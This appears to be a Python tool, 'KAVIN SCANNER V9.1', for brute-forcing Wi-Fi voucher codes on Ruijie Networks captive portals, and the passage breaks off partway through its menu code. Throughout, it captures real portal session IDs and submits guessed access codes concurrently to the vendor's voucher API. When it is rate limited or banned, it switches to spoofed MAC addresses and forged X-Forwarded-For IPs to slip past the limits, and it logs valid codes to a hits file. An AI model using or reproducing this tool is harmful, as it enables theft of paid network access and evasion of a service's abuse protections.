import os, time, random, string, json, asyncio, socket, threading, re, sys, uuid
import urllib3, requests, aiohttp
from collections import deque
from urllib.parse import urlparse, parse_qs, quote, unquote, urljoin
from rich.console import Console, Group
from rich.text import Text
from rich.prompt import Prompt
from rich.live import Live
from rich.panel import Panel
from rich.box import ROUNDED
from rich.table import Table
from rich.align import Align

try:
    import license as _license
    HAS_LICENSE_MODULE = True
except ImportError:
    HAS_LICENSE_MODULE = False
    _license = None

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

HITS_FILE = "hits.txt"
CONCURRENCY_LIMIT = 6
TIMEOUT = 12
SESSION_TTL = 90
SESSION_REUSE_MAX = 60
RUIJIE_BASE = "https://portal-as.ruijienetworks.com"
RUIJIE_MM_BASE = "https://portal-mm-as.ruijienetworks.com"
RUIJIE_WIFIDOG = "/api/auth/wifidog"
RUIJIE_VOUCHER = "/api/auth/voucher/?lang=en_US"

APP_NAME = "KAVIN SCANNER V9.1"
APP_TAG  = "@khant7997"

console = Console()
tried_codes = set()
code_lock = threading.Lock()
LICENSE_INFO = {"status": "Unverified"}

_REAL_OUIS = [
    "a4:50:46", "3c:cd:5d", "f4:8e:38", "b0:be:76", "8c:3b:ad",
    "00:1a:11", "d8:bb:c1", "60:38:e0", "e4:95:6e", "94:65:2d",
    "dc:a6:32", "b8:27:eb", "e4:5f:01", "2c:cf:67",
    "40:4e:36", "f0:18:98", "9c:fc:01", "04:0e:3c",
    "ac:bc:32", "7c:d1:c3", "3c:2e:ff",
    "5c:5f:67", "a8:6b:ad", "c0:ee:fb",
    "f0:9f:c2", "38:f9:d3", "6c:19:c0",
    "10:02:b5", "ec:fa:5c", "1c:1b:0d",
    "9a:8b:ec", "5c:5f:67", "a8:6b:ad",
]


def generate_random_mac():
    try:
        oui = random.choice(_REAL_OUIS).split(":")
        b = random.randint(0x00, 0x7e)
        return f"{oui[0]}:{oui[1]}:{oui[2]}:{b:02x}:{random.randint(0,0xff):02x}:{random.randint(0,0xff):02x}"
    except Exception:
        return "a4:50:46:12:34:56"


def generate_random_ip():
    try:
        if random.random() < 0.7:
            return f"192.168.{random.randint(1,254)}.{random.randint(2,254)}"
        return f"10.{random.randint(0,254)}.{random.randint(0,254)}.{random.randint(2,254)}"
    except Exception:
        return "192.168.1.50"


def get_gateway_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        p = ip.split(".")
        p[-1] = "1"
        return ".".join(p)
    except Exception:
        return "192.168.55.1"


def clear_screen():
    try:
        os.system('cls' if os.name == 'nt' else 'clear')
    except Exception:
        pass


def format_time(s):
    try:
        s = max(0, int(s))
        return f"{s//3600:02d}:{(s%3600)//60:02d}:{s%60:02d}"
    except Exception:
        return "00:00:00"


def epoch_ms_to_plan(ms, flow_bytes=0):
    try:
        ms = int(ms)
        if ms <= 0:
            return "N/A"
        now = int(time.time() * 1000)
        remain_s = max(0, (ms - now) // 1000)
        flow_gb = 0
        if flow_bytes:
            if isinstance(flow_bytes, str):
                if flow_bytes.endswith("M"):
                    try: flow_gb = round(float(flow_bytes[:-1]) / 1024, 2)
                    except Exception: pass
                elif flow_bytes.endswith("G"):
                    try: flow_gb = float(flow_bytes[:-1])
                    except Exception: pass
                else:
                    try: flow_gb = round(float(flow_bytes) / (1024**3), 2)
                    except Exception: pass
            else:
                try: flow_gb = round(int(flow_bytes) / (1024**3), 2)
                except Exception: pass
        tail = f" | {flow_gb}GB" if flow_gb else ""
        return f"{remain_s//3600}h{(remain_s%3600)//60}m{remain_s%60}s{tail}"
    except Exception:
        return "N/A"


def check_license():
    if not HAS_LICENSE_MODULE:
        return True, "No license module — skip"
    try:
        r = _license.check_approval()
        if isinstance(r, tuple):
            return r
        return bool(r), "Valid" if r else "Invalid"
    except Exception as e:
        return False, str(e)


def activate_license(k):
    if not HAS_LICENSE_MODULE:
        return True, "No license module"
    try:
        return _license.activate(k)
    except Exception as e:
        return False, str(e)


def _extract_portal_from_url(u):
    if not u:
        return None
    try:
        lo = u.lower()
        if "ruijienetworks" in lo and ("wifidog" in lo or "wifidogauth" in lo):
            return u
    except Exception:
        pass
    return None


def detect_and_capture():
    s = requests.Session()
    s.headers.update({
        "User-Agent": "Mozilla/5.0 (Linux; Android 14; SM-S911B) "
                      "AppleWebKit/537.36 (KHTML, like Gecko) "
                      "Chrome/120.0.0.0 Mobile Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    })

    gateways = [get_gateway_ip(), "192.168.55.1", "192.168.7.1",
                "192.168.1.1", "192.168.0.1", "192.168.100.1",
                "192.168.110.1", "192.168.233.1"]
    for gw in dict.fromkeys(gateways):
        for path in ("/", "/wifidog?stage=portal"):
            try:
                r = s.get(f"http://{gw}{path}", timeout=4, allow_redirects=False, verify=False)
                loc = r.headers.get("Location", "") or ""
                found = _extract_portal_from_url(loc)
                if found:
                    console.print("[green][+] Auto-captured portal via gateway redirect[/green]")
                    return found
            except Exception:
                pass
            try:
                r2 = s.get(f"http://{gw}{path}", timeout=4, allow_redirects=True, verify=False)
                if _extract_portal_from_url(r2.url):
                    console.print("[green][+] Auto-captured portal via gateway final[/green]")
                    return r2.url
                for h in r2.history:
                    hl = h.headers.get("Location", "") or ""
                    found = _extract_portal_from_url(hl)
                    if found:
                        console.print("[green][+] Auto-captured portal via history[/green]")
                        return found
            except Exception:
                pass

    probes = [
        "http://connectivitycheck.gstatic.com/generate_204",
        "http://detectportal.firefox.com/success.txt",
        "http://captive.apple.com/hotspot-detect.html",
        "http://www.msftconnecttest.com/connecttest.txt",
    ]
    for probe in probes:
        try:
            r = s.get(probe, allow_redirects=False, timeout=5, verify=False)
            found = _extract_portal_from_url(r.headers.get("Location", ""))
            if found:
                console.print("[green][+] Auto-captured portal via probe redirect[/green]")
                return found
            r2 = s.get(probe, allow_redirects=True, timeout=5, verify=False)
            if _extract_portal_from_url(r2.url):
                console.print("[green][+] Auto-captured portal via probe final[/green]")
                return r2.url
            for h in r2.history:
                found = _extract_portal_from_url(h.headers.get("Location", ""))
                if found:
                    console.print("[green][+] Auto-captured portal via probe history[/green]")
                    return found
        except Exception:
            continue

    console.print("[yellow][!] Auto-capture failed — manual paste လိုအပ်တယ်[/yellow]")
    return None


GW_KEYS = (
    "gw_id", "gw_sn", "gw_address", "gw_port", "nasip", "slot_num",
    "ssid", "chap_id", "chap_challenge", "stage", "ustate",
    "mac_req", "url", "gw_mac", "mac", "ip",
    "timestamp", "sign", "v",
)


def build_gw_params(portal_url):
    p = {
        "stage": "portal",
        "gw_id": "9cce882728a9",
        "gw_sn": "H1U61BK002346",
        "gw_address": "192.168.55.1",
        "gw_port": "2060",
        "nasip": "192.168.1.153",
        "ssid": "VLAN55",
        "slot_num": "15",
        "ustate": "0",
        "mac_req": "1",
        "chap_id": r"\211",
        "chap_challenge": r"\325\113\207\153\375\350\376\244\033\375\062\010\200\127\210\241",
        "url": "http://connectivitycheck.gstatic.com/generate_204",
        "v": "2",
        "_path": RUIJIE_WIFIDOG,
    }
    if not portal_url:
        return p

    try:
        pu = urlparse(portal_url)
        if "wifidogauth" in pu.path.lower():
            p["_path"] = "/auth/wifidogAuth/login/"
        q = parse_qs(pu.query)
        for k in GW_KEYS:
            if q.get(k):
                p[k] = unquote(q[k][0])

        if p.get("sign") and p.get("timestamp"):
            p["_locked"] = True
        else:
            p["_locked"] = False

        base = RUIJIE_MM_BASE if "portal-mm" in portal_url else RUIJIE_BASE
        p["_base"] = base
        if p.get("gw_address"):
            parts = p["gw_address"].split(".")
            if len(parts) == 4 and not q.get("nasip"):
                p["nasip"] = ".".join(parts[:3] + ["1"])
    except Exception:
        p["_locked"] = False
    return p


SESSION_PATTERNS = [
    r'[?&]sessionId=([A-Za-z0-9_\-=+/]{16,})',
    r'["\']?sessionId["\']?\s*[:=]\s*["\']([A-Za-z0-9_\-=+/]{16,})["\']',
    r'/wifidog\?[^"\'\s<>]*sessionId=([A-Za-z0-9_\-=+/]{16,})',
    r'window\.location(?:\.href)?\s*=\s*["\'][^"\']*sessionId=([A-Za-z0-9_\-=+/]{16,})',
    r'sessionId=([A-Za-z0-9_\-=+/]{16,})',
    r'"session"\s*:\s*"([A-Za-z0-9_\-=+/]{16,})"',
]
SIGN_PATTERNS = [r'[?&]sign=([A-Za-z0-9_\-=+/]+)',
                 r'["\']?sign["\']?\s*[:=]\s*["\']?([A-Za-z0-9_\-=+/]+)']
TS_PATTERNS = [r'[?&]timestamp=(\d{10,13})',
               r'["\']?timestamp["\']?\s*[:=]\s*["\']?(\d{10,13})']


def _find_first(patterns, text):
    if not text:
        return None
    for pat in patterns:
        try:
            m = re.search(pat, text, re.IGNORECASE)
            if m:
                return m.group(1).rstrip('"\';, ')
        except Exception:
            continue
    return None


def _extract_from_url(u):
    if not u:
        return None, None, None
    try:
        u = unquote(u)
        q = parse_qs(urlparse(u).query)
        return q.get("sessionId", [None])[0], q.get("sign", [None])[0], q.get("timestamp", [None])[0]
    except Exception:
        return None, None, None


def _extract_session(body, final_url, history, cookies_text=""):
    sid, sign, ts = _extract_from_url(final_url)
    if not sid and history:
        for h in reversed(history):
            loc = h if isinstance(h, str) else (h.headers.get("Location", "") or "")
            s, sg, t = _extract_from_url(loc)
            if s:
                sid, sign, ts = s, sg or sign, t or ts
                break
    if not sid:
        sid = _find_first(SESSION_PATTERNS, body)
    if not sid and cookies_text:
        try:
            m = re.search(r'sessionId=([A-Za-z0-9_\-=+/]{16,})', cookies_text, re.I)
            if m:
                sid = m.group(1)
        except Exception:
            pass
    if not sign:
        sign = _find_first(SIGN_PATTERNS, body)
    if not ts:
        ts = _find_first(TS_PATTERNS, body)
    if not sid and body:
        try:
            m = re.search(r'URL\s*=\s*["\']?([^"\'\s>]*sessionId=[^"\'\s>]+)', body, re.I)
            if m:
                s, sg, t = _extract_from_url(m.group(1))
                sid, sign, ts = s or sid, sg or sign, t or ts
        except Exception:
            pass
    return sid, sign, ts


def _sess_dict(sid, sign, ts, final_u, base, mac, ip):
    return {
        "sessionId": sid,
        "sign": sign,
        "timestamp": ts,
        "logonUrl": final_u,
        "url_base": base,
        "mac": mac,
        "ip": ip,
        "acquired": time.time(),
    }


async def fetch_real_session(session, gw_params, mac, ip, retries=5):
    errors = []
    base = gw_params.get("_base") or RUIJIE_BASE
    if "portal-mm" in base:
        base = RUIJIE_MM_BASE
    path = gw_params.get("_path") or RUIJIE_WIFIDOG
    base_full = base + path

    locked = bool(gw_params.get("_locked") and gw_params.get("sign")
                  and gw_params.get("timestamp"))
    locked_sign = gw_params.get("sign")
    locked_ts = gw_params.get("timestamp")

    use_mac = (gw_params.get("mac") or mac or generate_random_mac()).lower()
    use_ip = gw_params.get("ip") or ip or generate_random_ip()

    for attempt in range(retries):
        p = {k: v for k, v in gw_params.items()
             if not k.startswith("_")}
        p["mac"] = use_mac
        p["ip"] = use_ip
        p["url"] = base
        p.setdefault("v", "2")

        if locked:
            p["sign"] = locked_sign
            p["timestamp"] = locked_ts
        else:
            p["timestamp"] = str(int(time.time()))
            if not p.get("sign"):
                p.pop("sign", None)

        qs = "&".join(f"{k}={quote(str(v), safe='\\')}" for k, v in p.items())
        url = f"{base_full}?{qs}"

        headers = {
            "User-Agent": ("Mozilla/5.0 (Linux; Android 14; SM-S911B) "
                           "AppleWebKit/537.36 (KHTML, like Gecko) "
                           "Chrome/120.0.0.0 Mobile Safari/537.36"),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "Client-Mac": use_mac,
            "X-Forwarded-For": use_ip,
            "Referer": base + "/",
            "Connection": "close",
        }
        try:
            session.cookie_jar.clear()
        except Exception:
            pass

        try:
            async with session.get(url, headers=headers, timeout=TIMEOUT + 4,
                                   allow_redirects=False, ssl=False) as r1:
                loc = r1.headers.get("Location", "") or ""
                loc_low = loc.lower()

                if r1.status == 429 or any(x in loc_low for x in (
                    "request limited", "too many", "banned", "ip limit",
                    "rate limit", "not in service area",
                )):
                    if not locked:
                        use_mac = generate_random_mac().lower()
                        use_ip = generate_random_ip()
                    await asyncio.sleep(random.uniform(0.4, 1.0))
                    errors.append(f"banned@{r1.status}")
                    continue

                cookies_text = r1.headers.get("Set-Cookie", "") or ""
                sid, sign, ts = _extract_from_url(loc)
                if not sid:
                    sid = _find_first(SESSION_PATTERNS, loc)
                    sign = sign or _find_first(SIGN_PATTERNS, loc)
                    ts = ts or _find_first(TS_PATTERNS, loc)
                if not sid and cookies_text:
                    try:
                        m = re.search(r'sessionId=([A-Za-z0-9_\-=+/]{16,})', cookies_text, re.I)
                        if m:
                            sid = m.group(1)
                    except Exception:
                        pass
                if sid and len(sid) >= 16:
                    final_u = urljoin(base_full, loc) if loc else base_full
                    return ("REAL", _sess_dict(sid, sign, ts, final_u,
                                               base, use_mac, use_ip))
        except asyncio.TimeoutError:
            errors.append("timeout@r1")
        except asyncio.CancelledError:
            return ("FAIL", "retry-r1")
        except Exception as e:
            errors.append(f"err1:{type(e).__name__}")

        try:
            async with session.get(url, headers=headers, timeout=TIMEOUT + 4,
                                   allow_redirects=True, ssl=False) as r2:
                if r2.status == 429:
                    if not locked:
                        use_mac = generate_random_mac().lower()
                        use_ip = generate_random_ip()
                    await asyncio.sleep(random.uniform(0.4, 1.0))
                    errors.append("429@body")
                    continue

                body = await r2.text(errors="ignore")
                low = (body or "").lower()
                if any(x in low for x in ("request limited", "too many",
                                          "banned", "ip limit", "rate limit")):
                    if not locked:
                        use_mac = generate_random_mac().lower()
                        use_ip = generate_random_ip()
                    await asyncio.sleep(random.uniform(0.4, 1.0))
                    errors.append("banned@body")
                    continue

                hist = [str(hh.url) for hh in r2.history] + \
                       [hh.headers.get("Location", "") for hh in r2.history]
                cookies_text = ""
                try:
                    cookies_text = "; ".join(f"{c.key}={c.value}" for c in session.cookie_jar)
                except Exception:
                    pass
                sid, sign, ts = _extract_session(body, str(r2.url), hist, cookies_text)
                if sid and len(sid) >= 16:
                    return ("REAL", _sess_dict(sid, sign, ts, str(r2.url),
                                               base, use_mac, use_ip))
                errors.append(f"nosid@HTTP{r2.status}")
                if not locked:
                    use_mac = generate_random_mac().lower()
                    use_ip = generate_random_ip()
        except asyncio.TimeoutError:
            errors.append("timeout@r2")
            if not locked:
                use_mac = generate_random_mac().lower()
                use_ip = generate_random_ip()
        except asyncio.CancelledError:
            return ("FAIL", "retry-r2")
        except Exception as e:
            errors.append(f"err2:{type(e).__name__}")

        if attempt < retries - 1:
            await asyncio.sleep(0.3)

    return ("FAIL", "|".join(errors[-3:]) or "no-session")
async def test_code(session, sess, code, mac, ip):
    if not isinstance(sess, dict):
        return "__SESSION_EXPIRED__", "N/A"
    sid = sess.get("sessionId")
    if not sid:
        return "__SESSION_EXPIRED__", "N/A"

    base_url = (sess.get("url_base") or RUIJIE_BASE).rstrip("/")
    use_mac = (sess.get("mac") or mac or "").lower()
    use_ip = sess.get("ip") or ip or ""

    url = base_url + RUIJIE_VOUCHER
    if sess.get("sign") and sess.get("timestamp"):
        url += f"&sign={sess['sign']}&timestamp={sess['timestamp']}"

    ref_page = (f"{base_url}/download/static/maccauth/src/index_mm.html?sessionId={sid}"
                if "portal-mm" in base_url
                else f"{base_url}/download/static/maccauth/src/index.html?sessionId={sid}")

    headers = {
        "content-type": "application/json;charset=UTF-8",
        "user-agent": ("Mozilla/5.0 (Linux; Android 12; SM-A125F) "
                       "AppleWebKit/537.36 (KHTML, like Gecko) "
                       "Chrome/120.0.0.0 Mobile Safari/537.36"),
        "referer": ref_page,
        "Client-Mac": use_mac,
        "X-Forwarded-For": use_ip,
        "Accept": "application/json, text/plain, */*",
        "Origin": base_url,
        "Connection": "keep-alive",
    }
    payload = {"accessCode": code, "sessionId": sid, "apiVersion": 1}

    try:
        async with session.post(url, json=payload, headers=headers,
                                timeout=TIMEOUT, allow_redirects=False, ssl=False) as r:
            if r.status == 429:
                return "__RATE_LIMITED__", "N/A"

            text = await r.text(errors="ignore")
            if not text:
                return "__NETWORK_ERROR__", "N/A"

            low = text.lower()
            if "request limited" in low or "too many" in low or "rate limit" in low:
                return "__RATE_LIMITED__", "N/A"

            if any(x in low for x in ("session timed out", "invalid session",
                                      "session expired", "session not found",
                                      "please refresh", "session invalid",
                                      "session does not exist", "session timeout")):
                return "__SESSION_EXPIRED__", "N/A"

            real_plan = "N/A"
            is_hit = False
            try:
                j = json.loads(text)
                if isinstance(j, dict) and (j.get("success") is True or j.get("code") == 200):
                    is_hit = True
                    rd = j.get("result", {})
                    if isinstance(rd, dict):
                        exp = rd.get("expireTime") or rd.get("expire_time")
                        flow = rd.get("flow") or rd.get("bytes") or 0
                        if exp:
                            real_plan = epoch_ms_to_plan(exp, flow)
                        elif rd.get("duration"):
                            real_plan = f"{rd['duration']}s"
            except Exception:
                if '"success":true' in low or "congratulations" in low:
                    is_hit = True
            return ("HIT" if is_hit else text[:60]), real_plan

    except asyncio.TimeoutError:
        return "__TIMEOUT__", "N/A"
    except asyncio.CancelledError:
        return "__CANCELLED__", "N/A"
    except Exception as e:
        return f"__ERROR__:{type(e).__name__}", "N/A"


_CHARSETS = {"num": string.digits,
             "eng": string.ascii_lowercase,
             "mix": string.ascii_lowercase + string.digits}
seq_counter = 1
seq_lock = threading.Lock()


def gen_code(mode, length, scan_method="random"):
    chars = _CHARSETS.get(mode)
    if not chars:
        return ""
    space = len(chars) ** length
    global seq_counter

    if scan_method == "sequential":
        with seq_lock:
            n = seq_counter
            seq_counter += 1
        if n >= space:
            return None
        base = len(chars)
        out = []
        for _ in range(length):
            out.append(chars[n % base])
            n //= base
        return "".join(reversed(out))

    if len(tried_codes) >= space:
        return None
    with code_lock:
        use_set = space <= 500_000
        for _ in range(60):
            c = "".join(random.choices(chars, k=length))
            if not use_set or c not in tried_codes:
                if use_set:
                    tried_codes.add(c)
                return c
        return None


def render_dash(mode_str, scan_method, cur_code, tested, elapsed, status, hits,
                speed, mac, ip, sess_stat, sess_id, total):
    try:
        progress = min(100.0, (tested / total) * 100) if total else 0.0

        header = Panel(
            Align.center(Text(f"⚡ {APP_NAME} ⚡", style="bold bright_cyan")),
            border_style="cyan", box=ROUNDED, height=3
        )

        stat_tbl = Table.grid(expand=True, padding=(0, 1))
        for _ in range(4):
            stat_tbl.add_column(style="bold bright_white", justify="center")
        stat_style = "bold red" if any(x in str(status).upper() for x in (
            "ERR", "TIMEOUT", "BAN", "EXHAUST", "FAIL", "CHECK", "NO", "CANCEL"
        )) else "bold green"
        stat_tbl.add_row(
            Text("🚀 speed", style="bold cyan"),
            Text("📊 tested", style="bold cyan"),
            Text("📡 Status", style="bold cyan"),
            Text("⏱ Uptime", style="bold cyan"),
        )
        stat_tbl.add_row(
            Text(f"⚡ {int(speed)}", style="bold bright_white"),
            Text(f"🔢 {tested}", style="bold bright_white"),
            Text(f"{status}", style=stat_style),
            Text(f"🕒 {elapsed}", style="bold bright_white"),
        )
        stat_panel = Panel(stat_tbl, border_style="magenta", box=ROUNDED, height=4)

        cur_code_disp = cur_code if cur_code else "------"
        code_mode_panel = Panel(
            Align.center(Text(
                f"🎯 Current ( {cur_code_disp} )  /  🧩 mode : {mode_str} ({scan_method.upper()})",
                style="bold yellow"
            )),
            border_style="yellow", box=ROUNDED, height=3
        )

        sess_style = {"REAL": "bold green", "EXPIRED": "bold red", "BANNED": "bold red",
                      "HIT": "bold bright_green", "FAIL": "bold yellow",
                      "FETCH": "bold cyan"}.get(sess_stat, "bold cyan")
        sess_txt = (f"{sess_stat} ({(sess_id or '')[:8]})"
                    if sess_id and sess_id != "--------" else sess_stat)

        info_lines = Text()
        info_lines.append("  🔐 Session  -> ", style="bold white")
        info_lines.append(f"{sess_txt}\n", style=sess_style)
        info_lines.append("  📈 Progress -> ", style="bold white")
        info_lines.append(f"{progress:.2f}% ({tested:,}/{total:,})\n", style="bold bright_cyan")
        info_lines.append("  🖥 MAC/IP   -> ", style="bold white")
        info_lines.append(f"{mac}  /  {ip}", style="bold bright_white")

        info_panel = Panel(info_lines, border_style="blue", box=ROUNDED, height=5)

        vt = Table(show_header=True, header_style="bold bright_white", expand=True,
                   box=ROUNDED, border_style="green")
        vt.add_column("🔢 No.", style="bold cyan", justify="center", width=7)
        vt.add_column("🎟 VALID Code", style="bold bright_green", justify="center")
        vt.add_column("⏳ Plan (expireTime)", style="bold green", justify="center")
        vt.add_column("🕒 Timestamp", style="bold yellow", justify="center")

        recent_hits = list(hits)[-5:]
        if recent_hits:
            start_no = max(1, len(hits) - len(recent_hits) + 1)
            for idx, h in enumerate(recent_hits, start=start_no):
                vt.add_row(
                    str(idx),
                    f"🔑 {h.get('code', '')}",
                    str(h.get("plan", "N/A")),
                    str(h.get("time", "")),
                )
        else:
            vt.add_row("1", "—", "—", "—")

        footer = Panel(
            Align.center(Text(f"✨ Thank You {APP_TAG} ✨", style="bold bright_yellow")),
            border_style="red", box=ROUNDED, height=3
        )
        return Group(header, stat_panel, code_mode_panel, info_panel, vt, footer)
    except Exception:
        return Text("⏳ Loading...", style="bold cyan")


async def scan_loop_async(mode, length, scan_method, gw_params):
    global seq_counter
    tried_codes.clear()
    seq_counter = 1

    total_target = {"num": 10 ** length, "eng": 26 ** length,
                    "mix": 36 ** length}.get(mode, 1_000_000)
    mode_str = f"{mode.upper()}-{length}"

    hits = deque(maxlen=500)
    start = time.time()

    state = {"cur_code": "", "tested": 0, "status": "Init",
             "sess_stat": "NONE", "sess_id": "--------"}
    state_lock = threading.Lock()

    locked = bool(gw_params.get("_locked"))
    mac = gw_params.get("mac") or generate_random_mac()
    ip = gw_params.get("ip") or generate_random_ip()

    main_sess = None
    main_sess_time = 0.0
    main_sess_used = 0
    spare_task = None
    sess_lock = asyncio.Lock()

    fail_count = 0
    ban_cooldown = 2.0

    sem = asyncio.Semaphore(CONCURRENCY_LIMIT)
    conn = aiohttp.TCPConnector(limit=200, limit_per_host=0, ssl=False,
                                force_close=False, enable_cleanup_closed=True)

    def _snap():
        with state_lock:
            return dict(state)

    def set_state(**kw):
        with state_lock:
            state.update(kw)

    async def _fetch_one():
        try:
            return await fetch_real_session(session, gw_params, mac, ip, retries=5)
        except asyncio.CancelledError:
            return ("FAIL", "cancelled")
        except Exception as e:
            return ("FAIL", f"exc:{type(e).__name__}")

    async def session_health():
        nonlocal main_sess, main_sess_time, main_sess_used, spare_task
        nonlocal fail_count, ban_cooldown, mac, ip

        if main_sess is not None:
            if (time.time() - main_sess_time) < SESSION_TTL and main_sess_used < SESSION_REUSE_MAX:
                return True

        async with sess_lock:
            if spare_task is not None:
                if not spare_task.done():
                    set_state(status="Fetching session…", sess_stat="FETCH")
                    try:
                        await asyncio.shield(spare_task)
                    except Exception:
                        pass
                if spare_task.done():
                    try:
                        tag, payload = spare_task.result()
                    except Exception:
                        tag, payload = ("FAIL", "spare-error")
                    spare_task = None
                else:
                    tag, payload = ("FAIL", "spare-not-ready")
            else:
                set_state(status="Fetching session…", sess_stat="FETCH")
                tag, payload = await _fetch_one()

            if tag == "REAL" and isinstance(payload, dict):
                main_sess = payload
                main_sess_time = time.time()
                main_sess_used = 0
                if not locked:
                    mac = payload.get("mac", mac)
                    ip = payload.get("ip", ip)
                set_state(sess_stat="REAL", sess_id=payload["sessionId"], status="Active")
                fail_count = 0
                ban_cooldown = 2.0
                spare_task = asyncio.create_task(_fetch_one())
                return True

            if tag == "BAN":
                set_state(sess_stat="BANNED", status="Banned → rotate")
                if not locked:
                    mac = generate_random_mac()
                    ip = generate_random_ip()
                await asyncio.sleep(ban_cooldown)
                ban_cooldown = min(ban_cooldown * 1.4, 12)
                spare_task = asyncio.create_task(_fetch_one())
                return False

            set_state(sess_stat="FAIL", status=f"Fail: {str(payload)[:40]}")
            fail_count += 1
            if not locked:
                mac = generate_random_mac()
                ip = generate_random_ip()
            await asyncio.sleep(0.3 if fail_count < 2 else 0.8)
            if fail_count >= 2:
                fail_count = 0
            spare_task = asyncio.create_task(_fetch_one())
            return False

    async def timer_task():
        while True:
            try:
                s = _snap()
                elapsed = time.time() - start
                speed = (s["tested"] / max(1, elapsed)) * 60
                if live is not None:
                    live.update(render_dash(
                        mode_str, scan_method, s["cur_code"], s["tested"],
                        format_time(elapsed), s["status"], hits, speed,
                        mac, ip, s["sess_stat"], s["sess_id"], total_target
                    ), refresh=True)
            except asyncio.CancelledError:
                break
            except Exception:
                pass
            await asyncio.sleep(0.5)

    live = None
    async with aiohttp.ClientSession(connector=conn) as session:
        initial = render_dash(mode_str, scan_method, "", 0, "00:00:00", "Init",
                              hits, 0.0, mac, ip, "NONE", "--------", total_target)
        live = Live(initial, refresh_per_second=8, console=console, transient=False)
        try:
            live.start(refresh=True)
        except Exception:
            pass
        timer = asyncio.create_task(timer_task())

        try:
            ok = await session_health()
            while not ok:
                ok = await session_health()
        except Exception:
            pass

        try:
            while True:
                if main_sess is None:
                    ok = await session_health()
                    if not ok:
                        continue

                age = time.time() - main_sess_time
                if (age >= SESSION_TTL or main_sess_used >= SESSION_REUSE_MAX) \
                        and spare_task is None:
                    spare_task = asyncio.create_task(_fetch_one())

                batch = []
                exhausted = False
                while len(batch) < CONCURRENCY_LIMIT:
                    c = gen_code(mode, length, scan_method)
                    if c is None:
                        exhausted = True
                        break
                    if c and c not in batch:
                        batch.append(c)
                if exhausted and not batch:
                    set_state(status="EXHAUSTED")
                    break
                if not batch:
                    await asyncio.sleep(0.02)
                    continue

                async def _run(code):
                    async with sem:
                        return await test_code(session, main_sess, code, mac, ip)

                try:
                    results = await asyncio.gather(*[_run(c) for c in batch],
                                                   return_exceptions=True)
                except Exception:
                    results = []

                refresh_needed = False
                hit_flag = False
                for idx, r in enumerate(results):
                    with state_lock:
                        state["tested"] += 1
                        if idx < len(batch):
                            state["cur_code"] = batch[idx]
                    main_sess_used += 1

                    if isinstance(r, Exception):
                        continue
                    if not (isinstance(r, tuple) and len(r) == 2):
                        continue

                    res, plan = r
                    if res == "__SESSION_EXPIRED__":
                        refresh_needed = True
                        set_state(sess_stat="EXPIRED", status="Session expired → rotate")
                        break
                    if res == "__RATE_LIMITED__":
                        refresh_needed = True
                        set_state(sess_stat="BANNED", status="429 → rotate")
                        if not locked:
                            mac = generate_random_mac()
                            ip = generate_random_ip()
                        await asyncio.sleep(ban_cooldown)
                        ban_cooldown = min(ban_cooldown * 1.4, 12)
                        break
                    if isinstance(res, str) and res.startswith("__"):
                        continue

                    if res == "HIT":
                        ts = time.strftime("%H:%M:%S")
                        hits.append({"code": batch[idx], "plan": plan, "time": ts})
                        try:
                            with open(HITS_FILE, "a", encoding="utf-8") as f:
                                f.write(f"[{ts}] {batch[idx]} | {plan}\n")
                        except Exception:
                            pass
                        set_state(sess_stat="HIT")
                        hit_flag = True

                age = time.time() - main_sess_time
                if (main_sess_used >= SESSION_REUSE_MAX or age >= SESSION_TTL) and not refresh_needed:
                    refresh_needed = True
                    set_state(sess_stat="REAL", status="TTL/Reuse rotate")

                if refresh_needed:
                    async with sess_lock:
                        if spare_task is not None and spare_task.done():
                            try:
                                tag, payload = spare_task.result()
                            except Exception:
                                tag, payload = ("FAIL", "spare-err")
                            spare_task = None
                            if tag == "REAL" and isinstance(payload, dict):
                                main_sess = payload
                                main_sess_time = time.time()
                                main_sess_used = 0
                                if not locked:
                                    mac = payload.get("mac", mac)
                                    ip = payload.get("ip", ip)
                                set_state(sess_stat="REAL",
                                          sess_id=payload["sessionId"],
                                          status="Active")
                                spare_task = asyncio.create_task(_fetch_one())
                                continue
                        main_sess = None
                        main_sess_time = 0.0
                        main_sess_used = 0
                        if spare_task is None:
                            spare_task = asyncio.create_task(_fetch_one())

                if not refresh_needed and not hit_flag:
                    set_state(status="Active")

                await asyncio.sleep(0.005)

        except (KeyboardInterrupt, asyncio.CancelledError):
            set_state(status="Stopped")
        finally:
            timer.cancel()
            try:
                await timer
            except (asyncio.CancelledError, Exception):
                pass
            if spare_task is not None and not spare_task.done():
                spare_task.cancel()
                try:
                    await spare_task
                except (asyncio.CancelledError, Exception):
                    pass
            try:
                if live is not None:
                    live.stop()
            except Exception:
                pass

        s = _snap()
        try:
            console.print(Panel(
                Align.center(Text(
                    f"✅ Done • Tested {s['tested']:,} • Hits {len(hits)}",
                    style="bold bright_green")),
                border_style="green", box=ROUNDED))
        except Exception:
            pass

def show_banner():
    clear_screen()
    try:
        console.print()
        console.print(Text("══════════════════════════════════════",
                           style="bold bright_cyan"), justify="center")
        console.print(Text(f"⚡ {APP_NAME} ⚡", style="bold bright_white"), justify="center")
        console.print(Text("══════════════════════════════════════",
                           style="bold bright_cyan"), justify="center")
        console.print()
    except Exception:
        pass


def ask_mode():
    while True:
        show_banner()
        try:
            console.print("  [bold bright_cyan]1.[/bold bright_cyan] 🔢  Number   (0-9)")
            console.print("  [bold bright_cyan]2.[/bold bright_cyan] 🔤  Alphabet (a-z)")
            console.print("  [bold bright_cyan]3.[/bold bright_cyan] 🔀  Mixed    (a-z0-9)")
            console.print("  [bold bright_red]0.[/bold bright_red] ❌  Exit\n")
            c = Prompt.ask("  [bright_cyan]➜ Select[/bright_cyan]").strip()
        except (KeyboardInterrupt, EOFError, Exception):
            return None
        if c == "0":
            return None
        if c in ("1", "2", "3"):
            return {"1": "num", "2": "eng", "3": "mix"}[c]


def ask_length(mode):
    lengths = (6, 7, 8, 9)
    while True:
        show_banner()
        try:
            console.print(f"  [bold bright_white]Mode {mode.upper()} — Length[/bold bright_white]\n")
            for i, L in enumerate(lengths, 1):
                console.print(f"  [bold bright_cyan]{i}.[/bold bright_cyan] {L} chars")
            console.print("  [bold bright_red]0.[/bold bright_red] ↩ Back\n")
